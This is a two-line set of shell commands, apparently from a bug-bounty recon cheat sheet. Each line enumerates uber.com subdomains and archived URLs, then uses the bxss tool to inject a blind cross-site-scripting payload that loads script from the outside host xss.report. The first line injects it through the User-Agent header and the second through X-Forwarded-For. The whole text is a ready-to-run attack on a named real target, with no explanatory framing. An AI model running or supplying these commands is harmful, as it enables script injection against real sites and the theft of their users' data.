subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=https://xss.report/c/username></script>' -H "User-Agent" -t
subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=https://xss.report/c/username></script>' -H "X-Forwarded-For" -t
